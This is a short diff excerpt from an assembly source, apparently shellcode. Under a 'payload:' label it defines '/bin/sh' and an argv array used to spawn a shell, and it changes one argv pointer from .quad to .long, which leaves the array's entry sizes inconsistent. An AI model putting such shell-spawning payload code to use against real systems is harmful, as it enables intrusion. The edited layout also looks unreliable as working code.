@@ -38,7 +38,7 @@ payload:
 file_to_run:
         .ascii  "/bin/sh\0"
 argv:
-        .quad   file_to_run
+        .long   file_to_run
         .quad   0x0
         .quad   0x0
 
